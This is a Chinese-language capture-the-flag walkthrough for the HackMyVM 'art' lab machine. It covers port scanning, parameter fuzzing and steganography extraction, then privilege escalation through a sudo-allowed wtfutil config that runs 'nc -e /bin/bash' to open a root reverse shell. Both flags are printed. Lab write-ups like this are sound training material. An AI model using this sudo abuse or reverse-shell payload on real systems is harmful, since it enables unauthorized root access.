# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.43.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 03:00 EDT
Nmap scan report for 192.168.43.1
Host is up (0.0047s latency).
MAC Address: C6:45:66:05:91:88 (Unknown)
Nmap scan report for art (192.168.43.52)
Host is up (0.00031s latency).
MAC Address: 08:00:27:FF:B6:C9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for CET-AL00 (192.168.43.156)
Host is up (0.043s latency).
MAC Address: B2:A8:93:0D:FB:BD (Unknown)
Nmap scan report for DESKTOP-3NRITEO (192.168.43.197)
Host is up (0.00022s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for kali (192.168.43.126)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.93 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.43.52 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 03:03 EDT
Nmap scan report for art (192.168.43.52)
Host is up (0.00036s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FF:B6:C9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.80 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sV -O -p22,80 192.168.43.52  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 03:03 EDT
Nmap scan report for art (192.168.43.52)
Host is up (0.00030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
MAC Address: 08:00:27:FF:B6:C9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

# 漏洞利用

看一下80端口有什么

![image](https://github.com/user-attachments/assets/94311a25-d198-4a90-bb00-bed39ab1c517)

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.43.52
SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. -->
```

目录扫描，什么都没有

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.43.52 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.43.52
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,git,html,txt,php,jpg,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 170]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

尝试模糊测试

```
┌──(root㉿kali)-[~]
└─# ffuf -w /home/kali/SecLists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u 'http://192.168.43.52/index.php?FUZZ=FUZZ' -fc 403 -fs 170 -s -c
tag
┌──(root㉿kali)-[~]
└─# ffuf -w /home/kali/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u 'http://192.168.43.52/index.php?tag=FUZZ' -fc 403 -fs 170,70 -c -s
beauty
```

找到了一个图片，下载下来看看有什么

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.43.52/index.php?tag=beauty
SEE HMV GALLERY!
<br>
 <img src=dsa32.jpg><br>
<!-- Need to solve tag parameter problem. -->
┌──(kali㉿kali)-[~]
└─$ stegseek dsa32.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "yes.txt".
[i] Extracting to "dsa32.jpg.out".
```

![image](https://github.com/user-attachments/assets/4b604acf-dd58-411d-a471-e38da8d0b646)

# 权限提升

链接ssh，看一下都有什么

```
lion@art:~$ ls -la
total 32
drwxr-xr-x 3 lion lion 4096 ago  3  2022 .
drwxr-xr-x 3 root root 4096 ago  3  2022 ..
lrwxrwxrwx 1 lion lion    9 ago  3  2022 .bash_history -> /dev/null                                                             
-rw-r--r-- 1 lion lion  220 ago  3  2022 .bash_logout
-rw-r--r-- 1 lion lion 3526 ago  3  2022 .bashrc
drwxr-xr-x 3 lion lion 4096 ago  3  2022 .local
-rw-r--r-- 1 lion lion  807 ago  3  2022 .profile
-rw------- 1 lion lion   24 ago  3  2022 user.txt
-rw------- 1 lion lion   49 ago  3  2022 .Xauthority
lion@art:~$ sudo -l
Matching Defaults entries for lion on art:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil
lion@art:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
lion@art:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
lion@art:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
lion:x:1000:1000:lion,,,:/home/lion:/bin/bash
```

user.txt

```
lion@art:~$ cat user.txt 
HMVygUmTyvRPWduINKYfmpO
```

尝试利用wtfutil

![image](https://github.com/user-attachments/assets/434f668c-3efb-4e1b-8c31-ef4f8760538a)

提权

```
编辑一个a.yml
wtf:
  grid:
    columns: [20, 20]
    rows: [3, 3]
  refreshInterval: 1
  mods:
    uptime:
      type: cmdrunner
      args: ['-e','/bin/bash','192.168.43.126','1234']
      cmd: "nc"
      enabled: true
      position:
        top: 0
        left: 0
        height: 1
        width: 1
      refreshInterval: 30

sudo -u root /bin/wtfutil --config=a.yml
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.43.126] from (UNKNOWN) [192.168.43.52] 47406
id
uid=0(root) gid=0(root) grupos=0(root)
```

root.txt

```
cat /var/opt/root.txt
mZxbPCjEQYOqkNCuyIuTHMV
```
